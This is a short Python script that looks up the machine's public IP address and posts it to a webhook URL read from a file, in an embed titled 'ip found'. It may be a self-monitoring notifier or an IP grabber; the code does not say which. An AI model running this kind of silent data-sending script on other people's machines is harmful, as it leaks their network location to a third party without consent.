# Import all the needed packages 
import socket
from requests import get
import requests
import os 
# Make the variables
api = open("api.txt", "r")
ip1 = (api.read())
ip = get(ip1).text
webhooklink = open("webhook.txt", "r")
webhookURL = (webhooklink.read())
# Build the structure  of  the message 
data = {
    'username': 'ip',
    'embeds': [{
        'title': 'ip found',
        'description': "ip " + ': ' + ip,
    }]
}
# Send it 
result = requests.post(webhookURL, json = data)

try:
    result.raise_for_status()
except:
    pass